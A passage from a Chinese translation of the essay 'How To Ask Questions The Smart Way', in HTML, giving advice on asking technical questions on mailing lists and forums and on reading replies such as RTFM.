title="第二步，使用项目邮件列表"></a>第二步，使用项目邮件列表</h3><p>当某个项目提供开发者邮件列表时，要向列表而不是其中的个别成员提问，即使你确信他能最好地回答你的问题。查一查项目的文件和首页，找到项目的邮件列表并使用它。有几个很好的理由支持我们采用这种办法：</p><ul><li>任何好到需要向个别开发者提出的问题，也将对整个项目群组有益。反之，如果你认为自己的问题对整个项目群组来说太愚蠢，也不能成为骚扰个别开发者的理由。</li><li>向列表提问可以分散开发者的负担，个别开发者（尤其是项目领导人）也许太忙以至于没法回答你的问题。</li><li>大多数邮件列表都会被存档，那些被存档的内容将被搜索引擎索引。如果你向列表提问并得到解答，将来其它人可以通过网页搜索找到你的问题和答案，也就不用再次发问了。</li><li>如果某些问题经常被问到，开发者可以利用此信息来改进说明文件或软件本身，以使其更清楚。如果只是私下提问，就没有人能看到最常见问题的完整场景。</li></ul><p>如果一个项目既有”使用者” 也有”开发者”（或”黑客”）邮件列表或论坛，而你又不会动到那些源代码，那么就向”使用者”列表或论坛提问。不要假设自己会在开发者列表中受到欢迎，那些人多半会将你的提问视为干扰他们开发的噪音。</p><p>然而，如果你<strong>确信</strong>你的问题很特别，而且在”使用者” 列表或论坛中几天都没有回复，可以试试前往”开发者”列表或论坛发问。建议你在张贴前最好先暗地里观察几天以了解那里的行事方式（事实上这是参与任何私有或半私有列表的好主意）</p><p>如果你找不到一个项目的邮件列表，而只能查到项目维护者的电子邮件地址，尽管向他发信。即使是在这种情况下，也别假设（项目）邮件列表不存在。在你的电子邮件中，请陈述你已经试过但没有找到合适的邮件列表，也提及你不反对将自己的邮件转发给他人（许多人认为，即使没什么秘密，私人电子邮件也不应该被公开。通过允许将你的电子邮件转发他人，你给了相应人员处置你邮件的选择）。</p><h3 id="使用有意义且描述明确的标题"><a href="#使用有意义且描述明确的标题" class="headerlink" title="使用有意义且描述明确的标题"></a>使用有意义且描述明确的标题</h3><p>在邮件列表、新闻群组或论坛中，大约 50 字以内的标题是抓住资深专家注意力的好机会。别用喋喋不休的<code>帮帮忙</code>、<code>跪求</code>、<code>急</code>（更别说<code>救命啊！！！！</code>这样让人反感的话，用这种标题会被条件反射式地忽略）来浪费这个机会。不要妄想用你的痛苦程度来打动我们，而应该是在这点空间中使用极简单扼要的描述方式来提出问题。</p><p>一个好标题范例是<code>目标 —— 差异</code>式的描述，许多技术支持组织就是这样做的。在<code>目标</code>部分指出是哪一个或哪一组东西有问题，在<code>差异</code>部分则描述与期望的行为不一致的地方。</p><blockquote><p>蠢问题：救命啊！我的笔记本电脑不能正常显示了！</p></blockquote><blockquote><p>聪明问题：X.org 6.8.1 的鼠标光标会变形，某牌显卡 MV1005 芯片组。</p></blockquote><blockquote><p>更聪明问题：X.org 6.8.1 的鼠标光标，在某牌显卡 MV1005 芯片组环境下 - 会变形。</p></blockquote><p>编写<code>目标 —— 差异</code> 式描述的过程有助于你组织对问题的细致思考。是什么被影响了？ 仅仅是鼠标光标或者还有其它图形？只在 X.org 的 X 版中出现？或只是出现在 6.8.1 版中？ 是针对某牌显卡芯片组？或者只是其中的 MV1005 型号？ 一个黑客只需瞄一眼就能够立即明白你的环境<strong>和</strong>你遇到的问题。</p><p>总而言之，请想像一下你正在一个只显示标题的存档讨论串（Thread）索引中查寻。让你的标题更好地反映问题，可使下一个搜索类似问题的人能够关注这个讨论串，而不用再次提问相同的问题。</p><p>如果你想在回复中提出问题，记得要修改内容标题，以表明你是在问一个问题， 一个看起来像 <code>Re: 测试</code> 或者 <code>Re: 新 bug</code> 的标题很难引起足够重视。另外，在不影响连贯性之下，适当引用并删减前文的内容，能给新来的读者留下线索。</p><p>对于讨论串，不要直接点击回复来开始一个全新的讨论串，这将限制你的观众。因为有些邮件阅读程序，比如 mutt ，允许使用者按讨论串排序并通过折叠讨论串来隐藏消息，这样做的人永远看不到你发的消息。</p><p>仅仅改变标题还不够。mutt 和其它一些邮件阅读程序还会检查邮件标题以外的其它信息，以便为其指定讨论串。所以宁可发一个全新的邮件。</p><p>在网页论坛上，好的提问方式稍有不同，因为讨论串与特定的信息紧密结合，并且通常在讨论串外就看不到里面的内容，故通过回复提问，而非改变标题是可接受的。不是所有论坛都允许在回复中出现分离的标题，而且这样做了基本上没有人会去看。不过，通过回复提问，这本身就是暧昧的做法，因为它们只会被正在查看该标题的人读到。所以，除非你<strong>只想</strong>在该讨论串当前活跃的人群中提问，不然还是另起炉灶比较好。</p><h3 id="使问题容易回复"><a href="#使问题容易回复" class="headerlink" title="使问题容易回复"></a>使问题容易回复</h3><p>以<code>请将你的回复发送到……</code>来结束你的问题多半会使你得不到回答。如果你觉得花几秒钟在邮件客户端设置一下回复地址都麻烦，我们也觉得花几秒钟思考你的问题更麻烦。如果你的邮件程序不支持这样做，<a href="http://linuxmafia.com/faq/Mail/muas.html" target="_blank" rel="noopener">换个好点的</a>；如果是操作系统不支持这种邮件程序，也换个好点的。</p><p>在论坛，要求通过电子邮件回复是非常无礼的，除非你认为回复的信息可能比较敏感（有人会为了某些未知的原因，只让你而不是整个论坛知道答案）。如果你只是想在有人回复讨论串时得到电子邮件提醒，可以要求网页论坛发送给你。几乎所有论坛都支持诸如<code>追踪此讨论串</code>、<code>有回复时发送邮件提醒</code>等功能。</p><h3 id="用清晰、正确、精准且语法正确的语句"><a href="#用清晰、正确、精准且语法正确的语句" class="headerlink" title="用清晰、正确、精准且语法正确的语句"></a>用清晰、正确、精准且语法正确的语句</h3><p>我们从经验中发现，粗心的提问者通常也会粗心的写程序与思考（我敢打包票）。回答粗心大意者的问题很不值得，我们宁愿把时间耗在别处。</p><p>正确的拼写、标点符号和大小写是很重要的。一般来说，如果你觉得这样做很麻烦，不想在乎这些，那我们也觉得麻烦，不想在乎你的提问。花点额外的精力斟酌一下字句，用不着太僵硬与正式 —— 事实上，黑客文化很看重能准确地使用非正式、俚语和幽默的语句。但它<strong>必须很</strong>准确，而且有迹象表明你是在思考和关注问题。</p><p>正确地拼写、使用标点和大小写，不要将<code>its</code>混淆为<code>it&#39;s</code>，<code>loose</code>搞成<code>lose</code>或者将<code>discrete</code>弄成<code>discreet</code>。不要<strong>全部用大写</strong>，这会被视为无礼的大声嚷嚷（全部小写也好不到哪去，因为不易阅读。<a href="http://en.wikipedia.org/wiki/Alan_Cox" target="_blank" rel="noopener">Alan Cox</a> 也许可以这样做，但你不行）。</p><p>更白话的说，如果你写得像是个半文盲[译注：<a href="http://zh.wikipedia.org/wiki/小白" target="_blank" rel="noopener">小白</a>]，那多半得不到理睬。也不要使用即时通信中的简写或<a href="http://zh.wikipedia.org/wiki/火星文" target="_blank" rel="noopener">火星文</a>，如将<code>的</code>简化为<code>d</code>会使你看起来像一个为了少打几个键而省字的小白。更糟的是，如果像个小孩似地鬼画符那绝对是在找死，可以肯定没人会理你（或者最多是给你一大堆指责与挖苦）。</p><p>如果在使用非母语的论坛提问，你可以犯点拼写和语法上的小错，但决不能在思考上马虎（没错，我们通常能弄清两者的分别）。同时，除非你知道回复者使用的语言，否则请使用英语书写。繁忙的黑客一般会直接删除用他们看不懂语言写的消息。在网络上英语是通用语言，用英语书写可以将你的问题在尚未被阅读就被直接删除的可能性降到最低。</p><p>如果英文是你的外语（Second language），提示潜在回复者你有潜在的语言困难是很好的：<br>[译注：以下附上原文以供使用]</p><blockquote><p>English is not my native language; please excuse typing errors.</p></blockquote><ul><li>英文不是我的母语，请原谅我的错字或语法。</li></ul><blockquote><p>If you speak $LANGUAGE, please email/PM me;<br>I may need assistance translating my question.</p></blockquote><ul><li>如果你说<strong>某语言</strong>，请寄信/私讯给我；我需要有人协助我翻译我的问题。</li></ul><blockquote><p>I am familiar with the technical terms,<br>but some slang expressions and idioms are difficult for me.</p></blockquote><ul><li>我对技术名词很熟悉，但对于俗语或是特别用法比较不甚了解。</li></ul><blockquote><p>I’ve posted my question in $LANGUAGE and English.<br>I’ll be glad to translate responses, if you only use one or the other.</p></blockquote><ul><li>我把我的问题用<strong>某语言</strong>和英文写出来，如果你只用一种语言回答，我会乐意将其翻译成另一种。</li></ul><h3 id="使用易于读取且标准的文件格式发送问题"><a href="#使用易于读取且标准的文件格式发送问题" class="headerlink" title="使用易于读取且标准的文件格式发送问题"></a>使用易于读取且标准的文件格式发送问题</h3><p>如果你人为地将问题搞得难以阅读，它多半会被忽略，人们更愿读易懂的问题，所以：</p><ul><li>使用纯文字而不是 HTML (<a href="http://archive.birdhouse.org/etc/evilmail.html" target="_blank" rel="noopener">关闭 HTML</a> 并不难）。</li><li>使用 MIME 附件通常是可以的，前提是真正有内容（譬如附带的源代码或 patch），而不仅仅是邮件程序生成的模板（譬如只是信件内容的拷贝）。</li><li>不要发送一段文字只是一行句子但自动换行后会变成多行的邮件（这使得回复部分内容非常困难）。设想你的读者是在 80 个字符宽的终端机上阅读邮件，最好设置你的换行分割点小于 80 字。</li><li>但是，对一些特殊的文件<strong>不要</strong>设置固定宽度（譬如日志档案拷贝或会话记录）。数据应该原样包含，让回复者有信心他们看到的是和你看到的一样的东西。</li><li>在英语论坛中，不要使用<code>Quoted-Printable</code> MIME 编码发送消息。这种编码对于张贴非 ASCII 语言可能是必须的，但很多邮件程序并不支持这种编码。当它们处理换行时，那些文本中四处散布的<code>=20</code>符号既难看也分散注意力，甚至有可能破坏内容的语意。</li><li>绝对，<strong>永远</strong>不要指望黑客们阅读使用封闭格式编写的文档，像微软公司的 Word 或 Excel 文件等。大多数黑客对此的反应就像有人将还在冒热气的猪粪倒在你家门口时你的反应一样。即便他们能够处理，他们也很厌恶这么做。</li><li>如果你从使用 Windows 的电脑发送电子邮件，关闭微软愚蠢的<code>智能引号</code>功能 （从[选项] &gt; [校订] &gt; [自动校正选项]，勾选掉<code>智能引号</code>单选框），以免在你的邮件中到处散布垃圾字符。</li><li>在论坛，勿滥用<code>表情符号</code>和<code>HTML</code>功能（当它们提供时）。一两个表情符号通常没有问题，但花哨的彩色文本倾向于使人认为你是个无能之辈。过滥地使用表情符号、色彩和字体会使你看来像个傻笑的小姑娘。这通常不是个好主意，除非你只是对性而不是对答案感兴趣。</li></ul><p>如果你使用图形用户界面的邮件程序（如微软公司的 Outlook 或者其它类似的），注意它们的默认设置不一定满足这些要求。大多数这类程序有基于选单的<code>查看源代码</code>命令，用它来检查发送文件夹中的邮件，以确保发送的是纯文本文件同时没有一些奇怪的字符。</p><h3 id="精确地描述问题并言之有物"><a href="#精确地描述问题并言之有物" class="headerlink" title="精确地描述问题并言之有物"></a>精确地描述问题并言之有物</h3><ul><li>仔细、清楚地描述你的问题或 Bug 的症状。</li><li>描述问题发生的环境（机器配置、操作系统、应用程序、以及相关的信息），提供经销商的发行版和版本号（如：<code>Fedora Core 4</code>、<code>Slackware 9.1</code>等）。</li><li>描述在提问前你是怎样去研究和理解这个问题的。</li><li>描述在提问前为确定问题而采取的诊断步骤。</li><li>描述最近做过什么可能相关的硬件或软件变更。</li><li>尽可能的提供一个可以<code>重现这个问题的可控环境</code>的方法。</li></ul><p>尽量去揣测一个黑客会怎样反问你，在你提问之前预先将黑客们可能遇到的问题回答一遍。</p><p>以上几点中，当你报告的是你认为可能在代码中的问题时，给黑客一个可以重现你的问题的环境尤其重要。当你这么做时，你得到有效的回答的机会和速度都会大大的提升。</p><p><a href="http://www.chiark.greenend.org.uk/~sgtatham/" target="_blank" rel="noopener">Simon Tatham</a> 写过一篇名为《<a href="http://www.chiark.greenend.org.uk/~sgtatham/bugs-cn.html" target="_blank" rel="noopener">如何有效的报告 Bug</a>》的出色文章。强力推荐你也读一读。</p><h3 id="话不在多而在精"><a href="#话不在多而在精" class="headerlink" title="话不在多而在精"></a>话不在多而在精</h3><p>你需要提供精确有内容的信息。这并不是要求你简单的把成堆的出错代码或者资料完全转录到你的提问中。如果你有庞大而复杂的测试样例能重现程序挂掉的情境，尽量将它剪裁得越小越好。</p><p>这样做的用处至少有三点。<br>第一，表现出你为简化问题付出了努力，这可以使你得到回答的机会增加；<br>第二，简化问题使你更有可能得到<strong>有用</strong>的答案；<br>第三，在精炼你的 bug 报告的过程中，你很可能就自己找到了解决方法或权宜之计。</p><h3 id="别动辄声称找到-Bug"><a href="#别动辄声称找到-Bug" class="headerlink" title="别动辄声称找到 Bug"></a>别动辄声称找到 Bug</h3><p>当你在使用软件中遇到问题，除非你非常、<strong>非常</strong>的有根据，不要动辄声称找到了 Bug。提示：除非你能提供解决问题的源代码补丁，或者提供回归测试来表明前一版本中行为不正确，否则你都多半不够完全确信。这同样适用在网页和文件，如果你（声称）发现了文件的<code>Bug</code>，你应该能提供相应位置的修正或替代文件。</p><p>请记得，还有许多其它使用者没遇到你发现的问题，否则你在阅读文件或搜索网页时就应该发现了（你在抱怨前<a href="#在提问之前">已经做了这些，是吧</a>？）。这也意味着很有可能是你弄错了而不是软件本身有问题。</p><p>编写软件的人总是非常辛苦地使它尽可能完美。如果你声称找到了 Bug，也就是在质疑他们的能力，即使你是对的，也有可能会冒犯到其中某部分人。当你在标题中嚷嚷着有<code>Bug</code>时，这尤其严重。</p><p>提问时，即使你私下非常确信已经发现一个真正的 Bug，最好写得像是<strong>你</strong>做错了什么。如果真的有 Bug，你会在回复中看到这点。这样做的话，如果真有 Bug，维护者就会向你道歉，这总比你惹恼别人然后欠别人一个道歉要好一点。</p><h3 id="低声下气不能代替你的功课"><a href="#低声下气不能代替你的功课" class="headerlink" title="低声下气不能代替你的功课"></a>低声下气不能代替你的功课</h3><p>有些人明白他们不该粗鲁或傲慢的提问并要求得到答复，但他们选择另一个极端 —— 低声下气：<code>我知道我只是个可悲的新手，一个撸瑟，但...</code>。这既使人困扰，也没有用，尤其是伴随着与实际问题含糊不清的描述时更令人反感。</p><p>别用原始灵长类动物的把戏来浪费你我的时间。取而代之的是，尽可能清楚地描述背景条件和你的问题情况。这比低声下气更好地定位了你的位置。</p><p>有时网页论坛会设有专为新手提问的版面，如果你真的认为遇到了初学者的问题，到那去就是了，但一样别那么低声下气。</p><h3 id="描述问题症状而非你的猜测"><a href="#描述问题症状而非你的猜测" class="headerlink" title="描述问题症状而非你的猜测"></a>描述问题症状而非你的猜测</h3><p>告诉黑客们你认为问题是怎样造成的并没什么帮助。（如果你的推断如此有效，还用向别人求助吗？），因此要确信你原原本本告诉了他们问题的症状，而不是你的解释和理论；让黑客们来推测和诊断。如果你认为陈述自己的猜测很重要，清楚地说明这只是你的猜测，并描述为什么它们不起作用。</p><p><strong>蠢问题</strong></p><blockquote><p>我在编译内核时接连遇到 SIG11 错误，<br>我怀疑某条飞线搭在主板的走线上了，这种情况应该怎样检查最好？</p></blockquote><p><strong>聪明问题</strong></p><blockquote><p>我的组装电脑是 FIC-PA2007 主机板搭载 AMD K6/233 CPU（威盛 Apollo VP2 芯片组），<br>256MB Corsair PC133 SDRAM 内存，在编译内核时，从开机 20 分钟以后就频频产生 SIG11 错误，<br>但是在头 20 分钟内从没发生过相同的问题。重新启动也没有用，但是关机一晚上就又能工作 20 分钟。<br>所有内存都换过了，没有效果。相关部分的标准编译记录如下…。</p></blockquote><p>由于以上这点似乎让许多人觉得难以配合，这里有句话可以提醒你：<code>所有的诊断专家都来自密苏里州。</code> 美国国务院的官方座右铭则是：<code>让我看看</code>（出自国会议员 Willard D. Vandiver 在 1899 年时的讲话：<code>我来自一个出产玉米，棉花，牛蒡和民主党人的国家，滔滔雄辩既不能说服我，也不会让我满意。我来自密苏里州，你必须让我看看。</code>） 针对诊断者而言，这并不是一种怀疑，而只是一种真实而有用的需求，以便让他们看到的是与你看到的原始证据尽可能一致的东西，而不是你的猜测与归纳的结论。所以，大方的展示给我们看吧！</p><h3 id="按发生时间先后列出问题症状"><a href="#按发生时间先后列出问题症状" class="headerlink" title="按发生时间先后列出问题症状"></a>按发生时间先后列出问题症状</h3><p>问题发生前的一系列操作，往往就是对找出问题最有帮助的线索。因此，你的说明里应该包含你的操作步骤，以及机器和软件的反应，直到问题发生。在命令行处理的情况下，提供一段操作记录（例如运行脚本工具所生成的），并引用相关的若干行（如 20 行）记录会非常有帮助。</p><p>如果挂掉的程序有诊断选项（如 -v 的详述开关），试着选择这些能在记录中增加调试信息的选项。记住，<code>多</code>不等于<code>好</code>。试着选取适当的调试级别以便提供有用的信息而不是让读者淹没在垃圾中。</p><p>如果你的说明很长（如超过四个段落），在开头简述问题，接下来再按时间顺序详述会有所帮助。这样黑客们在读你的记录时就知道该注意哪些内容了。</p><h3 id="描述目标而不是过程"><a href="#描述目标而不是过程" class="headerlink" title="描述目标而不是过程"></a>描述目标而不是过程</h3><p>如果你想弄清楚如何做某事（而不是报告一个 Bug），在开头就描述你的目标，然后才陈述重现你所卡住的特定步骤。</p><p>经常寻求技术帮助的人在心中有个更高层次的目标，而他们在自以为能达到目标的特定道路上被卡住了，然后跑来问该怎么走，但没有意识到这条路本身就有问题。结果要费很大的劲才能搞定。</p><p><strong>蠢问题</strong></p><blockquote><p>我怎样才能从某绘图程序的颜色选择器中取得十六进制的的 RGB 值？</p></blockquote><p><strong>聪明问题</strong></p><blockquote><p>我正试着用替换一幅图片的色码（color table）成自己选定的色码，我现在知道的唯一方法是编辑每个色码区块（table slot），<br>但却无法从某绘图程序的颜色选择器取得十六进制的的 RGB 值。</p></blockquote><p>第二种提问法比较聪明，你可能得到像是<code>建议采用另一个更合适的工具</code>的回复。</p><h3 id="别要求使用私人电邮回复"><a href="#别要求使用私人电邮回复" class="headerlink" title="别要求使用私人电邮回复"></a>别要求使用私人电邮回复</h3><p>黑客们认为问题的解决过程应该公开、透明，此过程中如果更有经验的人注意到不完整或者不当之处，最初的回复才能够、也应该被纠正。同时，作为提供帮助者可以得到一些奖励，奖励就是他的能力和学识被其他同行看到。</p><p>当你要求私下回复时，这个过程和奖励都被中止。别这样做，让<strong>回复者</strong>来决定是否私下回答 —— 如果他真这么做了，通常是因为他认为问题编写太差或者太肤浅，以至于对其它人没有兴趣。</p><p>这条规则存在一条有限的例外，如果你确信提问可能会引来大量雷同的回复时，那么这个神奇的提问句会是<code>向我发电邮，我将为论坛归纳这些回复</code>。试着将邮件列表或新闻群组从洪水般的雷同回复中解救出来是非常有礼貌的 —— 但你必须信守诺言。</p><h3 id="清楚明确的表达你的问题以及需求"><a href="#清楚明确的表达你的问题以及需求" class="headerlink" title="清楚明确的表达你的问题以及需求"></a>清楚明确的表达你的问题以及需求</h3><p>漫无边际的提问是近乎无休无止的时间黑洞。最有可能给你有用答案的人通常也正是最忙的人（他们忙是因为要亲自完成大部分工作）。这样的人对无节制的时间黑洞相当厌恶，所以他们也倾向于厌恶那些漫无边际的提问。</p><p>如果你明确表述需要回答者做什么（如提供指点、发送一段代码、检查你的补丁、或是其他等等），就最有可能得到有用的答案。因为这会定出一个时间和精力的上限，便于回答者能集中精力来帮你。这么做很棒。</p><p>要理解专家们所处的世界，请把专业技能想像为充裕的资源，而回复的时间则是稀缺的资源。你要求他们奉献的时间越少，你越有可能从真正专业而且很忙的专家那里得到解答。</p><p>所以，界定一下你的问题，使专家花在辨识你的问题和回答所需要付出的时间减到最少，这技巧对你有用答案相当有帮助 —— 但这技巧通常和简化问题有所区别。因此，问<code>我想更好的理解 X，可否指点一下哪有好一点说明？</code>通常比问<code>你能解释一下 X 吗？</code>更好。如果你的代码不能运作，通常请别人看看哪里有问题，比要求别人替你改正要明智得多。</p><h3 id="询问有关代码的问题时"><a href="#询问有关代码的问题时" class="headerlink" title="询问有关代码的问题时"></a>询问有关代码的问题时</h3><p>别要求他人帮你调试有问题的代码，不提示一下应该从何入手。张贴几百行的代码，然后说一声：<code>它不能工作</code>会让你完全被忽略。只贴几十行代码，然后说一句：<code>在第七行以后，我期待它显示 &lt;x&gt;，但实际出现的是 &lt;y&gt;</code>比较有可能让你得到回应。</p><p>最有效描述程序问题的方法是提供最精简的 Bug 展示测试用例（bug-demonstrating test case）。什么是最精简的测试用例？那是问题的缩影；一小个程序片段能<strong>刚好</strong>展示出程序的异常行为，而不包含其他令人分散注意力的内容。怎么制作最精简的测试用例？如果你知道哪一行或哪一段代码会造成异常的行为，复制下来并加入足够重现这个状况的代码（例如，足以让这段代码能被编译/直译/被应用程序处理）。如果你无法将问题缩减到一个特定区块，就复制一份代码并移除不影响产生问题行为的部分。总之，测试用例越小越好（查看<a href="#话不在多而在精">话不在多而在精</a>一节）。</p><p>一般而言，要得到一段相当精简的测试用例并不太容易，但永远先尝试这样做的是种好习惯。这种方式可以帮助你了解如何自行解决这个问题 —— 而且即使你的尝试不成功，黑客们也会看到你在尝试取得答案的过程中付出了努力，这可以让他们更愿意与你合作。</p><p>如果你只是想让别人帮忙审查（Review）一下代码，在信的开头就要说出来，并且一定要提到你认为哪一部分特别需要关注以及为什么。</p><h3 id="别把自己家庭作业的问题贴上来"><a href="#别把自己家庭作业的问题贴上来" class="headerlink" title="别把自己家庭作业的问题贴上来"></a>别把自己家庭作业的问题贴上来</h3><p>黑客们很擅长分辨哪些问题是家庭作业式的问题；因为我们中的大多数都曾自己解决这类问题。同样，这些问题得由<strong>你</strong>来搞定，你会从中学到东西。你可以要求给点提示，但别要求得到完整的解决方案。</p><p>如果你怀疑自己碰到了一个家庭作业式的问题，但仍然无法解决，试试在使用者群组，论坛或（最后一招）在项目的<strong>使用者</strong>邮件列表或论坛中提问。尽管黑客们<strong>会</strong>看出来，但一些有经验的使用者也许仍会给你一些提示。</p><h3 id="去掉无意义的提问句"><a href="#去掉无意义的提问句" class="headerlink" title="去掉无意义的提问句"></a>去掉无意义的提问句</h3><p>避免用无意义的话结束提问，例如<code>有人能帮我吗？</code>或者<code>这有答案吗？</code>。</p><p>首先：如果你对问题的描述不是很好，这样问更是画蛇添足。</p><p>其次：由于这样问是画蛇添足，黑客们会很厌烦你 —— 而且通常会用逻辑上正确，但毫无意义的回答来表示他们的蔑视， 例如：<code>没错，有人能帮你</code>或者<code>不，没答案</code>。</p><p>一般来说，避免用 <code>是或否</code>、<code>对或错</code>、<code>有或没有</code>类型的问句，除非你想得到<a href="http://homepage.ntlworld.com./jonathan.deboynepollard/FGA/questions-with-yes-or-no-answers.html" target="_blank" rel="noopener">是或否类型的回答</a>。</p><h3 id="即使你很急也不要在标题写紧急"><a href="#即使你很急也不要在标题写紧急" class="headerlink" title="即使你很急也不要在标题写紧急"></a>即使你很急也不要在标题写<code>紧急</code></h3><p>这是你的问题，不是我们的。宣称<code>紧急</code>极有可能事与愿违：大多数黑客会直接删除无礼和自私地企图即时引起关注的问题。更严重的是，<code>紧急</code>这个字（或是其他企图引起关注的标题）通常会被垃圾信过滤器过滤掉 —— 你希望能看到你问题的人可能永远也看不到。</p><p>有半个例外的情况是，如果你是在一些很高调，会使黑客们兴奋的地方，也许值得这样去做。在这种情况下，如果你有时间压力，也很有礼貌地提到这点，人们也许会有兴趣回答快一点。</p><p>当然，这风险很大，因为黑客们兴奋的点多半与你的不同。譬如从 NASA 国际空间站（International Space Station）发这样的标题没有问题，但用自我感觉良好的慈善行为或政治原因发肯定不行。事实上，张贴诸如<code>紧急：帮我救救这个毛绒绒的小海豹！</code>肯定让你被黑客忽略或惹恼他们，即使他们认为毛绒绒的小海豹很重要。</p><p>如果你觉得这点很不可思议，最好再把这份指南剩下的内容多读几遍，直到你弄懂了再发文。</p><h3 id="礼多人不怪，而且有时还很有帮助"><a href="#礼多人不怪，而且有时还很有帮助" class="headerlink" title="礼多人不怪，而且有时还很有帮助"></a>礼多人不怪，而且有时还很有帮助</h3><p>彬彬有礼，多用<code>请</code>和<code>谢谢您的关注</code>，或<code>谢谢你的关照</code>。让大家都知道你对他们花时间免费提供帮助心存感激。</p><p>坦白说，这一点并没有比清晰、正确、精准并合法语法和避免使用专用格式重要（也不能取而代之）。黑客们一般宁可读有点唐突但技术上鲜明的 Bug 报告，而不是那种有礼但含糊的报告。（如果这点让你不解，记住我们是按问题能教给我们什么来评价问题的价值的）</p><p>然而，如果你有一串的问题待解决，客气一点肯定会增加你得到有用回应的机会。</p><p>（我们注意到，自从本指南发布后，从资深黑客那里得到的唯一严重缺陷反馈，就是对预先道谢这一条。一些黑客觉得<code>先谢了</code>意味着事后就不用再感谢任何人的暗示。我们的建议是要么先说<code>先谢了</code>，<strong>然后</strong>事后再对回复者表示感谢，或者换种方式表达感激，譬如用<code>谢谢你的关注</code>或<code>谢谢你的关照</code>。）</p><h3 id="问题解决后，加个简短的补充说明"><a href="#问题解决后，加个简短的补充说明" class="headerlink" title="问题解决后，加个简短的补充说明"></a>问题解决后，加个简短的补充说明</h3><p>问题解决后，向所有帮助过你的人发个说明，让他们知道问题是怎样解决的，并再一次向他们表示感谢。如果问题在新闻组或者邮件列表中引起了广泛关注，应该在那里贴一个说明比较恰当。</p><p>最理想的方式是向最初提问的话题回复此消息，并在标题中包含<code>已修正</code>，<code>已解决</code>或其它同等含义的明显标记。在人来人往的邮件列表里，一个看见讨论串<code>问题 X</code>和<code>问题 X - 已解决</code>的潜在回复者就明白不用再浪费时间了（除非他个人觉得<code>问题 X</code>的有趣），因此可以利用此时间去解决其它问题。</p><p>补充说明不必很长或是很深入；简单的一句<code>你好，原来是网线出了问题！谢谢大家 – Bill</code>比什么也不说要来的好。事实上，除非结论真的很有技术含量，否则简短可爱的小结比长篇大论更好。说明问题是怎样解决的，但大可不必将解决问题的过程复述一遍。</p><p>对于有深度的问题，张贴调试记录的摘要是有帮助的。描述问题的最终状态，说明是什么解决了问题，在此<strong>之后</strong>才指明可以避免的盲点。避免盲点的部分应放在正确的解决方案和其它总结材料之后，而不要将此信息搞成侦探推理小说。列出那些帮助过你的名字，会让你交到更多朋友。</p><p>除了有礼貌和有内涵以外，这种类型的补充也有助于他人在邮件列表/新闻群组/论坛中搜索到真正解决你问题的方案，让他们也从中受益。</p><p>至少，这种补充有助于让每位参与协助的人因问题的解决而从中得到满足感。如果你自己不是技术专家或者黑客，那就相信我们，这种感觉对于那些你向他们求助的大师或者专家而言，是非常重要的。问题悬而未决会让人灰心；黑客们渴望看到问题被解决。好人有好报，满足他们的渴望，你会在下次提问时尝到甜头。</p><p>思考一下怎样才能避免他人将来也遇到类似的问题，自问写一份文件或加个常见问题（FAQ）会不会有帮助。如果是的话就将它们发给维护者。</p><p>在黑客中，这种良好的后继行动实际上比传统的礼节更为重要，也是你如何透过善待他人而赢得声誉的方式，这是非常有价值的资产。</p><h2 id="如何解读答案"><a href="#如何解读答案" class="headerlink" title="如何解读答案"></a>如何解读答案</h2><p><a id="RTFM"></a></p><h3 id="RTFM-和-STFW：如何知道你已完全搞砸了"><a href="#RTFM-和-STFW：如何知道你已完全搞砸了" class="headerlink" title="RTFM 和 STFW：如何知道你已完全搞砸了"></a>RTFM 和 STFW：如何知道你已完全搞砸了</h3><p>有一个古老而神圣的传统：如果你收到<code>RTFM （Read The Fucking Manual）</code>的回应，回答者认为你<strong>应该去读他妈的手册</strong>。当然，基本上他是对的，你应该去读一读。</p><p>RTFM 有一个年轻的亲戚。如果你收到<code>STFW（Search The Fucking Web）</code>的回应，回答者认为你<strong>应该到他妈的网上搜索</strong>。那人多半也是对的，去搜索一下吧。（更温和一点的说法是 <strong><a href="http://lmgtfy.com/" target="_blank" rel="noopener">Google 是你的朋友</a></strong>！）</p><p>在论坛，你也可能被要求去爬爬论坛的旧文。事实上，有人甚至可能热心地为你提供以前解决此问题的讨论串。但不要依赖这种关照，提问前应该先搜索一下旧文。</p><p>通常，用这两句之一回答你的人会给你一份包含你需要内容的手册或者一个网址，而且他们打这些字的时候也正在读着。这些答复意味着回答者认为</p><ul><li><strong>你需要的信息非常容易获得</strong>；</li><li><strong>你自己去搜索这些信息比灌给你，能让你学到更多</strong>。</li></ul><p>你不应该因此不爽；<strong>依照黑客的标准，他已经表示了对你一定程度的关注，而没有对你的要求视而不见</strong>。你应该对他祖母般的慈祥表示感谢。</p><h3 id="如果还是搞不懂"><a href="#如果还是搞不懂" class="headerlink" title="如果还是搞不懂"></a>如果还是搞不懂</h3><p>如果你看不懂回应，别立刻要求对方解释。像你以前试着自己解决问题时那样（利用手册，FAQ，网络，身边的高手），先试着去搞懂他的回应。如果你真的需要对方解释，记得表现出你已经从中学到了点什么。</p><p>比方说，如果我回答你：<code>看来似乎是 zentry 卡住了；你应该先清除它。</code>，然后，这是一个<strong>很糟的</strong>后续问题回应：<code>zentry 是什么？</code> <strong>好</strong>的问法应该是这样：<code>哦~~~我看过说明了但是只有 -z 和 -p 两个参数中提到了 zentries，而且还都没有清楚的解释如何清除它。你是指这两个中的哪一个吗？还是我看漏了什么？</code></p><h3 id="处理无礼的回应"><a href="#处理无礼的回应" class="headerlink" title="处理无礼的回应"></a>处理无礼的回应</h3><p>很多黑客圈子中看似无礼的行为并不是存心冒犯。相反，它是直接了当，一针见血式的交流风格，这种风格更注重解决问题，而不是使人感觉舒服而却模模糊糊。</p><p>如果你觉得被冒犯了，试着平静地反应。如果有人真的做了出格的事，邮件列表、新闻群组或论坛中的前辈多半会招呼他。如果这<strong>没有</strong>发生而你却发火了，那么你发火对象的言语可能在黑客社区中看起来是正常的，而<strong>你</strong>将被视为有错的一方，这将伤害到你获取信息或帮助的机会。</p><p>另一方面，你偶尔真的会碰到无礼和无聊的言行。与上述相反，对真正的冒犯者狠狠地打击，用犀利的语言将其驳得体无完肤都是可以接受的。然而，在行事之前一定要非常非常的有根据。纠正无礼的言论与开始一场毫无意义的口水战仅一线之隔，黑客们自己莽撞地越线的情况并不鲜见。如果你是新手或外人，避开这种莽撞的机会并不高。如果你想得到的是信息而不是消磨时光，这时最好不要把手放在键盘上以免冒险。</p><p>（有些人断言很多黑客都有轻度的自闭症或亚斯伯格综合症，缺少用于润滑人类社会<strong>正常</strong>交往所需的神经。这既可能是真也可能是假的。如果你自己不是黑客，兴许你认为我们脑袋有问题还能帮助你应付我们的古怪行为。只管这么干好了，我们不在乎。我们<